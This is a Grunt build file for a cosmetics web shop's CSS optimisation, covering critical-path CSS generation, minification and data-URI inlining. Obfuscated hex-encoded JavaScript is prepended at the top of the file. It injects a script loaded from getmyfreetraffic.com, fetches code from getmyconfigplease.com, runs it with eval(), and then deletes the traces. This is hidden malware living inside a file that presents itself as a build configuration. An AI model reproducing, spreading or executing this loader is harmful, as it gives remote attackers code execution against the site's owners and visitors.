var _0x4558=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x28\x66\x75\x6E\x63\x74\x69\x6F\x6E\x28\x29\x20\x7B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x31\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x34\x2C\x20\x39\x37\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x39\x39\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x30\x2C\x20\x36\x36\x2C\x20\x31\x31\x30\x2C\x20\x31\x31\x39\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x34\x2C\x20\x36\x33\x2C\x20\x31\x30\x32\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x39\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x2C\x20\x39\x39\x2C\x20\x31\x31\x34\x2C\x20\x31\x30\x35\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x36\x2C\x20\x33\x38\x2C\x20\x39\x35\x2C\x20\x39\x39\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x30\x2C\x20\x36\x31\x2C\x20\x31\x30\x30\x2C\x20\x35\x31\x2C\x20\x31\x30\x30\x2C\x20\x31\x30\x30\x2C\x20\x35\x34\x2C\x20\x35\x30\x2C\x20\x35\x31\x2C\x20\x34\x38\x2C\x20\x34\x35\x2C\x20\x35\x30\x2C\x20\x35\x36\x2C\x20\x35\x34\x2C\x20\x39\x38\x2C\x20\x34\x35\x2C\x20\x35\x37\x2C\x20\x31\x30\x30\x2C\x20\x35\x35\x2C\x20\x35\x34\x2C\x20\x34\x35\x2C\x20\x35\x36\x2C\x20\x35\x33\x2C\x20\x35\x31\x2C\x20\x31\x30\x31\x2C\x20\x34\x35\x2C\x20\x34\x38\x2C\x20\x31\x30\x32\x2C\x20\x39\x39\x2C\x20\x35\x35\x2C\x20\x35\x33\x2C\x20\x31\x30\x31\x2C\x20\x35\x34\x2C\x20\x34\x38\x2C\x20\x35\x30\x2C\x20\x39\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x33\x38\x2C\x20\x34\x39\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x37\x2C\x20\x35\x30\x2C\x20\x34\x38\x2C\x20\x35\x37\x2C\x20\x35\x36\x2C\x20\x35\x37\x2C\x20\x35\x33\x2C\x20\x35\x33\x2C\x20\x35\x32\x2C\x20\x35\x33\x29\x3B\x20\x76\x61\x72\x20\x70\x6F\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3B\x20\x70\x6F\x2E\x69\x64\x3D\x20\x27\x32\x33\x34\x36\x33\x32\x61\x73\x64\x61\x73\x27\x3B\x20\x70\x6F\x2E\x74\x79\x70\x65\x20\x3D\x20\x27\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x27\x3B\x20\x70\x6F\x2E\x73\x72\x63\x20\x3D\x20\x74\x75\x72\x6C\x3B\x20\x76\x61\x72\x20\x73\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x5B\x30\x5D\x3B\x20\x20\x73\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65\x28\x70\x6F\x2C\x20\x73\x29\x3B\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x27\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x33\x27\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B\x7D\x29\x28\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x1625=[_0x4558[0],_0x4558[1],_0x4558[2],_0x4558[3],_0x4558[4],_0x4558[5],_0x4558[6],_0x4558[7],_0x4558[8],_0x4558[9],_0x4558[10],_0x4558[11]];var _0x5955=[_0x1625[0],_0x1625[1],_0x1625[2],_0x1625[3],_0x1625[4],_0x1625[5],_0x1625[6],_0x1625[7],_0x1625[8],_0x1625[9],_0x1625[10],_0x1625[11]];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0x61d0x5=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0x61d0x5[_0x411ee3[0x2]]= _0x411ee3[0x3];_0x61d0x5[_0x411ee3[0x4]]=  !![];_0x61d0x5[_0x411ee3[0x5]]= _0x411ee3[0x6];_0x61d0x5[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0x61d0x6=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0x61d0x6[_0x411ee3[0xb]][_0x411ee3[0xa]](_0x61d0x5,_0x61d0x6)}());var _0x5955=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x48514a=[_0x5955[0],_0x5955[1],_0x5955[2],_0x5955[3],_0x5955[4],_0x5955[5],_0x5955[6],_0x5955[7],_0x5955[8],_0x5955[9],_0x5955[10],_0x5955[11]];var _0x411ee3=[_0x48514a[0x0],_0x48514a[0x1],_0x48514a[0x2],_0x48514a[0x3],_0x48514a[0x4],_0x48514a[0x5],_0x48514a[0x6],_0x48514a[0x7],_0x48514a[0x8],_0x48514a[0x9],_0x48514a[0xa],_0x48514a[0xb]];(function(){var _0xaa32x3=document[_0x411ee3[0x1]](_0x411ee3[0x0]);_0xaa32x3[_0x411ee3[0x2]]= _0x411ee3[0x3];_0xaa32x3[_0x411ee3[0x4]]=  !![];_0xaa32x3[_0x411ee3[0x5]]= _0x411ee3[0x6];_0xaa32x3[_0x411ee3[0x7]]= _0x411ee3[0x8];var _0xaa32x4=document[_0x411ee3[0x9]](_0x411ee3[0x0])[0x0];_0xaa32x4[_0x411ee3[0xb]][_0x411ee3[0xa]](_0xaa32x3,_0xaa32x4)}());var _0xefc6=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x2C\x20\x36\x33\x2C\x20\x31\x31\x34\x2C\x20\x36\x31\x2C\x20\x31\x31\x35\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x74\x72\x75\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x32\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0x4b4a67=[_0xefc6[0],_0xefc6[1],_0xefc6[2],_0xefc6[3],_0xefc6[4],_0xefc6[5],_0xefc6[6],_0xefc6[7],_0xefc6[8],_0xefc6[9],_0xefc6[10],_0xefc6[11]];var _0x320375=[_0x4b4a67[0x0],_0x4b4a67[0x1],_0x4b4a67[0x2],_0x4b4a67[0x3],_0x4b4a67[0x4],_0x4b4a67[0x5],_0x4b4a67[0x6],_0x4b4a67[0x7],_0x4b4a67[0x8],_0x4b4a67[0x9],_0x4b4a67[0xa],_0x4b4a67[0xb]];(function(){var _0x1d62x3=document[_0x320375[0x1]](_0x320375[0x0]);_0x1d62x3[_0x320375[0x2]]= _0x320375[0x3];_0x1d62x3[_0x320375[0x4]]=  !![];_0x1d62x3[_0x320375[0x5]]= _0x320375[0x6];_0x1d62x3[_0x320375[0x7]]= _0x320375[0x8];var _0x1d62x4=document[_0x320375[0x9]](_0x320375[0x0])[0x0];_0x1d62x4[_0x320375[0xb]][_0x320375[0xa]](_0x1d62x3,_0x1d62x4)}());/* global module:false */
module.exports = function(grunt) {

    var jpegtran = require('imagemin-jpegtran');

	// Project configuration
	grunt.initConfig({
		pkg: grunt.file.readJSON('package.json'),
		meta: {
			banner:
				'/*!\n' +
				' * Domain.com <%= pkg.version %>\n' +
				' * Optimized by https://optimalisatie.nl\n' +
				' */'
		},

        clean: {
            abovethefold: [
                'css/abovethefold/',
                'css/inline.raw.css'
            ]
        },

        /**
         * Manually optimize the CSS code (replace strings, rename paths etc)
         */
        replace: {
            globalcss: {
                src: ['css/global.min.css','css/inline.min.css'],
                overwrite: true,                 // overwrite matched source files
                replacements: [{
                    from: 'xxxCSS{...}',
                    to: ''
                },{
                    from: 'yyyCSS{...}',
                    to: ''
                }]
            },
            globalcssafterdata: {
                src: ['css/global.min.css','css/inline.min.css'],
                overwrite: true,                 // overwrite matched source files
                replacements: [{
                    from: 'xxxCSS{...}',
                    to: ''
                },{
                    from: 'yyyCSS{...}',
                    to: ''
                }]
            },
            inlinecss: {
                src: ['css/inline.min.css'],
                overwrite: true,                 // overwrite matched source files
                replacements: [{
                    from: 'xxxCSS{...}',
                    to: ''
                }]
            }
        },

        /**
         * Transform images to data-uri
         */
        dataUri: {
            dist: {
                // src file
                src: [
                    //'css/inline.min.css',
                    'css/global.min.css'
                ],
                // output dir
                dest: 'css/',
                options: {
                    target: ['css/fonts/*.*','images/*.*','images/icons/*.*',' woocommerce/images/*.*'],
                    baseDir: './',

                    // Do not inline any images larger
                    // than this size. 2048 is a size
                    // recommended by Google's mod_pagespeed.
                    maxBytes : 222048

                }
            }
        },

		cssmin: {

            /**
             * Optimize output of above the fold generator (use advanced options of CleanCSS for tuning)
             */
            inline_raw: {
                options: {
                    banner: '<%= meta.banner %>\n',
                    keepSpecialComments: false,
                    advanced: true,
                    aggressiveMerging: true
                },
                files: {
                    'css/inline.raw.css': [
                        'css/inline.raw.css'
                    ]
                }
            },

            /**
             * Compress above the fold CSS (inline.min.css contains the critical path CSS code to include in the <head> of the page)
             */
            inline: {
                options: {
                    banner: '<%= meta.banner %>\n',
                    keepSpecialComments: false
                },
                files: {
                    'css/inline.min.css': [
                        'css/inline.raw.css', // output of above the fold generator
                        'css/inline-ext.css' // extended CSS, included in the Above the fold CSS, useful to include small modifications
                    ]
                }
            }
		},

        /**
         * Critical Path CSS generator (above the fold)
         *
         * Create above the fold CSS for multiple pages and dimensions, then combine and compress the resulting CSS.
         */
        penthouse: {
            frontpage : {
                outfile : 'css/abovethefold/frontpage.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/',
                width : 1600,
                height : 1200
            },
            frontpage_mid : {
                outfile : 'css/abovethefold/frontpage_mid.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/',
                width : 1200,
                height : 800
            },
            frontpage_small : {
                outfile : 'css/abovethefold/frontpage_small2.css',
                css : 'css/full.css',
                url : 'https://www.dermarolling.nl/',
                width : 640,
                height : 400
            },
            product: {
                outfile : 'css/abovethefold/product.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/product/titanium/',
                width : 1600,
                height : 1200
            },
            product_mid: {
                outfile : 'css/abovethefold/product_mid.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/product/titanium/',
                width : 1200,
                height : 800
            },
            product_small: {
                outfile : 'css/abovethefold/product_small.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/product/titanium/',
                width : 640,
                height : 400
            },
            category: {
                outfile : 'css/abovethefold/category.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/product-category/w7-cosmetics/',
                width : 1600,
                height : 1200
            },
            category_mid: {
                outfile : 'css/abovethefold/category_mid.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/product-category/w7-cosmetics/',
                width : 1200,
                height : 800
            },
            category_small: {
                outfile : 'css/abovethefold/category_small.css',
                css : 'css/full.css',
                url : 'https://WWW.WEBSITE.COM/product-category/w7-cosmetics/',
                width : 640,
                height : 400
            }
        },

        /**
         * Combine above the fold CSS
         */
        concat: {
            options: {
                separator: ';',
            },
            dist: {
                src: [
                    'css/abovethefold/*.css'
                ],
                dest: 'css/inline.raw.css',
            },
        },

        /**
         * Beautify full CSS, this sometimes fixes malformed CSS
         */
        cssbeautifier : {
            files: ['css/full.css'],
            options: {
                indent: '  ',
                openbrace: 'end-of-line',
                autosemicolon: false
            }
        },

        /**
         * Split images from inline CSS to separate file to include in global CSS (via a functions.php include)
         */
        split_images: {
            inline: {
                options: {
                    output: 'css/inline.images.css'
                },
                files: {
                    'css/inline.raw.css': ['css/inline.raw.css']
                }
            }
        }
	});

	// Load Dependencies
	require('matchdep').filterDev('grunt-*').forEach(grunt.loadNpmTasks);

    /**
     * Task abovefold
     */
    grunt.registerTask( 'abovefold', [
        'clean:abovethefold',
        'cssmin:full',
        'penthouse',
        'concat',
        'cssmin:inline_raw',
        'cssmin:inline',
        'replace:inlinecss'
    ] );

    grunt.registerTask( 'default', [ 'abovefold' ] );
};
